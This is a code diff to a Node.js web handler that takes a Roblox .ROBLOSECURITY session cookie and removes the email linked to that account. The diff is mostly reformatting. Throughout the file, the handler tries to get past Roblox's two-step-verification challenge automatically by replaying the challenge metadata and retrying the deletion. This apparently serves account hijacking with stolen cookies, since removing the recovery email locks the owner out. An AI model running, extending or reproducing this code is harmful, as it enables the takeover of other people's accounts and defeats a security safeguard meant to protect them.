@@ -13,13 +13,11 @@ module.exports = async (req, res) => {
     return res.end(JSON.stringify({ error: "Missing .ROBLOSECURITY cookie" }));
   }
 
-  // Clean the cookie - remove any prefix if present
   cookie = cookie.trim();
   if (cookie.includes(".ROBLOSECURITY=")) {
     cookie = cookie.split(".ROBLOSECURITY=")[1];
   }
 
-  // Basic validation - Roblox security cookies are typically long alphanumeric strings
   if (cookie.length < 50) {
     res.writeHead(400, { "Content-Type": "application/json" });
     return res.end(
@@ -40,8 +38,7 @@ module.exports = async (req, res) => {
       res.writeHead(400, { "Content-Type": "application/json" });
       return res.end(
         JSON.stringify({
-          error:
-            "No email linked to this account or failed to fetch email information",
+          error: "No email linked or failed to fetch email information",
           debug: emailInfo,
         }),
       );
@@ -52,45 +49,51 @@ module.exports = async (req, res) => {
     let result = await deleteEmail(cookie, csrfToken, emailToDelete);
 
     if (result && result.needsChallenge) {
-        console.log("⚠️ Challenge required. Attempting to continue challenge...");
-        
-        try {
-          // Attempt to continue the challenge automatically
-          const challengeResult = await continueChallenge(cookie, csrfToken, result.challengeId, result.challengeMetadata);
-          console.log("Challenge continue result:", challengeResult);
-          
-          if (challengeResult.success) {
-            console.log("✅ Challenge passed. Retrying email removal...");
-            // Retry the email deletion with the challenge continuation
-            result = await deleteEmail(cookie, csrfToken, emailToDelete, result.challengeId);
-          } else {
-            console.log("❌ Challenge continue failed:", challengeResult);
-            res.writeHead(403, { "Content-Type": "application/json" });
-            return res.end(
-              JSON.stringify({
-                error: "Challenge continuation failed",
-                needsChallenge: true,
-                challengeId: result.challengeId,
-                challengeType: result.challengeType,
-                challengeDetails: challengeResult
-              })
-            );
-          }
-        } catch (challengeError) {
-          console.error("❌ Challenge handling error:", challengeError);
+      console.log("⚠️ Challenge required. Attempting to continue challenge...");
+      try {
+        const challengeResult = await continueChallenge(
+          cookie,
+          csrfToken,
+          result.challengeId,
+          result.challengeMetadata,
+        );
+        console.log("Challenge continue result:", challengeResult);
+
+        if (challengeResult.success) {
+          console.log("✅ Challenge passed. Retrying email removal...");
+          result = await deleteEmail(
+            cookie,
+            csrfToken,
+            emailToDelete,
+            result.challengeId,
+          );
+        } else {
+          console.log("❌ Challenge continue failed:", challengeResult);
           res.writeHead(403, { "Content-Type": "application/json" });
           return res.end(
             JSON.stringify({
-              error: "Challenge handling failed: " + challengeError.message,
+              error: "Challenge continuation failed",
               needsChallenge: true,
               challengeId: result.challengeId,
-              challengeType: result.challengeType
-            })
+              challengeType: result.challengeType,
+              challengeDetails: challengeResult,
+            }),
           );
         }
+      } catch (challengeError) {
+        console.error("❌ Challenge handling error:", challengeError);
+        res.writeHead(403, { "Content-Type": "application/json" });
+        return res.end(
+          JSON.stringify({
+            error: "Challenge handling failed: " + challengeError.message,
+            needsChallenge: true,
+            challengeId: result.challengeId,
+            challengeType: result.challengeType,
+          }),
+        );
+      }
     }
 
-    // Check if the deletion was successful
     if (result && result.errors && result.errors.length > 0) {
       const error = result.errors[0];
       res.writeHead(403, { "Content-Type": "application/json" });
@@ -195,10 +198,10 @@ function deleteEmail(cookie, csrfToken, emailAddress, challengeId = null) {
       "Content-Type": "application/json",
       Accept: "application/json",
       "Content-Length": Buffer.byteLength(payload),
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "User-Agent":
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     };
 
-    // Add challenge headers if retrying after challenge
     if (challengeId) {
       headers["rblx-challenge-id"] = challengeId;
       headers["rblx-challenge-type"] = "twostepverification";
@@ -223,11 +226,12 @@ function deleteEmail(cookie, csrfToken, emailAddress, challengeId = null) {
           try {
             const parsed = data ? JSON.parse(data) : { success: true };
 
-            // Handle challenge required response
             if (res.statusCode === 403 && parsed.errors) {
-              const challengeError = parsed.errors.find(e => e.code === 0 || e.message?.includes("Challenge"));
+              const challengeError = parsed.errors.find(
+                (e) =>
+                  e.code === 0 || e.message?.toLowerCase().includes("challenge"),
+              );
               if (challengeError) {
-                // Check for challenge headers (use rblx- prefix)
                 const challengeId = res.headers["rblx-challenge-id"];
                 const challengeType = res.headers["rblx-challenge-type"];
 
@@ -237,7 +241,7 @@ function deleteEmail(cookie, csrfToken, emailAddress, challengeId = null) {
                     challengeId: challengeId,
                     challengeType: challengeType,
                     challengeMetadata: res.headers["rblx-challenge-metadata"],
-                    error: "Challenge verification required"
+                    error: "Challenge verification required",
                   });
                   return;
                 }
@@ -260,24 +264,21 @@ function deleteEmail(cookie, csrfToken, emailAddress, challengeId = null) {
   });
 }
 
-
-
 function continueChallenge(cookie, csrfToken, challengeId, challengeMetadata) {
   return new Promise((resolve, reject) => {
     console.log("Attempting to continue challenge using latest Roblox challenge API...");
-    
+
     if (!challengeMetadata) {
       resolve({
         success: false,
-        error: "No challenge metadata provided"
+        error: "No challenge metadata provided",
       });
       return;
     }
 
-    // Create payload using the exact same data Roblox provided
     const payload = JSON.stringify({
       challengeId: challengeId,
-      challengeMetadata: challengeMetadata // Send back the exact same base64 metadata
+      challengeMetadata: challengeMetadata,
     });
 
     console.log("Challenge payload:", payload);
@@ -293,7 +294,8 @@ function continueChallenge(cookie, csrfToken, challengeId, challengeMetadata) {
           "Content-Type": "application/json",
           Accept: "application/json",
           "Content-Length": Buffer.byteLength(payload),
-          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+          "User-Agent":
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         },
       },
       (res) => {
@@ -306,22 +308,22 @@ function continueChallenge(cookie, csrfToken, challengeId, challengeMetadata) {
 
           try {
             const parsed = data ? JSON.parse(data) : {};
-            
+
             if (res.statusCode === 200 || res.statusCode === 204) {
               resolve({ success: true, data: parsed });
             } else {
-              resolve({ 
-                success: false, 
-                status: res.statusCode, 
+              resolve({
+                success: false,
+                status: res.statusCode,
                 data: parsed,
-                error: `HTTP ${res.statusCode} Data: ${data}`
+                error: `HTTP ${res.statusCode} Data: ${data}`,
               });
             }
           } catch (e) {
             resolve({
               success: false,
               error: `Invalid JSON response: ${data}`,
-              status: res.statusCode
+              status: res.statusCode,
             });
           }
         });
@@ -332,4 +334,4 @@ function continueChallenge(cookie, csrfToken, challengeId, challengeMetadata) {
     req.write(payload);
     req.end();
   });
-}
+        }
